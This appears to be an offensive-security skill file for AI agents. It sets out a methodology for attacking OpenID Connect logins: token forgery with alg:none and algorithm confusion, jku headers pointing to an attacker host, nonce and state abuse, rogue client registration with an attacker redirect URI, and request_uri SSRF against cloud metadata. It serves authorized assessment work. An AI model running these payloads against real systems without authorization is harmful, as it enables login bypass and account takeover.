---
name: offensive-oidc-attacks
description: "OpenID Connect (OIDC) specific attack methodology beyond OAuth 2.0 — ID token validation flaws, alg:none and key confusion (RS256-vs-HS256, RS256-vs-secret), JWKS endpoint poisoning, nonce / state replay, ID token swap (ID token vs access token confusion), audience and issuer confusion, dynamic client registration abuse, request_uri SSRF, mix-up attacks across multiple IdPs, and PKCE downgrade. Use when assessing applications using OIDC SSO (vs raw OAuth) — authentication-purpose flows have different threat model than authorization-purpose ones."
---

# OIDC Attacks

OAuth 2.0 is for authorization; OIDC adds an authentication layer on top with the ID token. The ID token's content is what client apps use to "log in" the user. Misvalidating the ID token = login bypass.

(For OAuth-specific attacks like open redirect in `redirect_uri`, see `offensive-oauth`.)

## Quick Workflow

1. Identify the OIDC IdP (Auth0, Okta, Azure AD, Cognito, Keycloak, etc.)
2. Capture the full flow including the ID token
3. Validate each claim's purpose: signature, audience, issuer, nonce, expiry
4. Test each validation for missing or weak enforcement

---

## ID Token Anatomy

```json
{
  "iss": "https://idp.example.com",
  "sub": "user-12345",
  "aud": "client-app-abc",
  "exp": 1700000000,
  "iat": 1699996400,
  "nonce": "abc123",
  "email": "user@example.com",
  "email_verified": true
}
```

Signed with the IdP's RSA private key. Client validates signature against IdP's public JWKS, then validates each claim.

## Signature Attacks (Same as JWT)

See `offensive-jwt` for full coverage. OIDC-specific:

### alg:none

```
{"alg":"none"} . {"sub":"admin","aud":"client-id"} . ""
```

If the client trusts the JWT library default and the library accepts `alg:none`, signature check skipped.

### RS256 → HS256 Algorithm Confusion

```
Original: alg=RS256, signed by IdP private key
Attack: alg=HS256, signed using IdP's public key as the HMAC secret
```

If client validates by treating the public key (from JWKS) as the HMAC secret, attacker forges arbitrary tokens.

### JWKS URL Override

Some clients fetch JWKS from a URL specified in the token's `kid` or `jku` header. Inject your own URL:

```
{"alg":"RS256", "jku":"https://attacker.com/jwks.json", "kid":"1"}
```

Client fetches your JWKS → validates with your key → accepts.

## Issuer / Audience Confusion

Client must validate `iss` matches expected IdP and `aud` includes their client ID.

If the client only checks one:

- Token issued for **another client** of the same IdP (with attacker as the legitimate user there) — replayed at this client succeeds
- Token issued for **another IdP that this client also trusts** — cross-IdP confusion

```bash
# Capture token from your own account at one OIDC integration
# Replay at the target client if aud or iss not strictly checked
```

## Nonce Replay

OIDC requires the client to send a `nonce` in the AuthnRequest, and the IdP echoes it in the ID token. The client must validate the echoed nonce matches what it sent.

If nonce is not checked:

- Capture a victim's signed ID token
- Replay it in your own session

Many OIDC libraries default to nonce-not-required when implicit flow is disabled — but if it's accidentally re-enabled, nonce check disappears.

## State Parameter

`state` is OAuth-level CSRF protection. If client doesn't send/validate, attacker forces victim into attacker's auth flow → victim's account binds to attacker's session.

```html
<!-- attacker.com -->
<a href="https://idp.com/authorize?response_type=code&client_id=...&redirect_uri=https://app.com/callback&scope=openid&nonce=xxx">Click</a>
<!-- Victim clicks; logs in to IdP; redirects to app.com/callback?code=...; app.com logs them in but session was bound to attacker's request, not victim's request -->
```

## ID Token vs Access Token Confusion

Some apps accept the **access token** for authentication purposes when they should require the **ID token**. Or vice versa. Audit the auth check at each protected endpoint.

```http
GET /api/me
Authorization: Bearer <access_token>      vs.    Authorization: Bearer <id_token>
```

Different tokens, different intended audiences. Confusion = identity-bypass.

## Implicit Flow Vulnerabilities

The implicit flow (`response_type=token id_token`) returns tokens directly in the URL fragment. Browser security model has specific concerns:

- Token in URL → leaked via Referer to third-party JS
- No code-to-token exchange → no CSRF protection on token issuance
- Tokens fragment-stored → readable from any same-origin script

Modern OIDC discourages implicit; PKCE flow recommended.

## PKCE Downgrade

If both PKCE-enabled and PKCE-disabled clients exist on the same IdP, attacker registers a non-PKCE client config and migrates to it.

```
Server: requires PKCE for client A
Attacker: registers client B without PKCE; tricks user into auth at B
```

## Dynamic Client Registration Abuse

If the IdP allows dynamic client registration (public endpoint), attacker registers a client with attacker-controlled `redirect_uri`. Then:

- Phish target users into auth at the attacker-owned client
- Receive their access/ID tokens
- Use against any RP that trusts the same IdP for the same `aud`

```bash
curl -X POST https://idp.com/register -d '{
  "redirect_uris": ["https://attacker.com/callback"],
  "grant_types": ["authorization_code"],
  "response_types": ["code"]
}'
```

## request_uri SSRF

OIDC `request_uri` parameter lets the client pre-load a request from a URL. If the IdP fetches `request_uri` server-side, and it's user-controllable:

```
https://idp.com/authorize?request_uri=http://169.254.169.254/...
```

IdP performs the fetch → SSRF.

## Mix-Up Attacks

When a client supports multiple IdPs and the user picks one, parts of the flow can be confused if:

- Authorization endpoint of IdP A
- Token endpoint of IdP B (somehow)
- Tokens validated as if from IdP A but actually from B

Defenses: validate `iss` strictly; validate `aud` includes own client ID at this IdP only.

## Engagement Cheatsheet

```bash
# 1. Capture full OIDC flow
# Burp Proxy + SAML Tracer-style monitoring

# 2. Decode the ID token
echo "<id_token>" | cut -d. -f2 | base64 -d | jq

# 3. Test each claim validation:
[ ] alg:none → forge token
[ ] alg confusion (RS256 → HS256 with public key as secret)
[ ] jku/kid override to attacker JWKS
[ ] iss check (forge with different iss)
[ ] aud check (forge for different client)
[ ] exp / nbf (forge with past/future)
[ ] nonce check (replay valid token in new session)

# 4. State / CSRF checks
# Initiate auth from attacker → land on victim with attacker's account

# 5. Implicit flow exposure
# Inspect URL fragments after auth → tokens visible to all same-origin scripts

# 6. Dynamic client registration
# Try POST to /register; check redirect_uri restrictions

# 7. request_uri SSRF
# https://idp/authorize?request_uri=http://internal-svc/

# 8. Document each: which claim/check failed, exact forged token, impact
```

## Reporting

- Specific IdP product + version
- Exact validation that's missing
- Forged token PoC (with claims annotated)
- Impact: account takeover, role escalation, cross-tenant access, etc.
- Library or product responsible

---

## Key References

- OpenID Connect Core 1.0 specification
- "OAuth 2.0 Threat Model and Security Considerations" — RFC 6819
- "OAuth 2.0 Security Best Current Practice" — RFC 9700
- PortSwigger Web Security Academy: OAuth + OIDC chapters
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/oidc.md
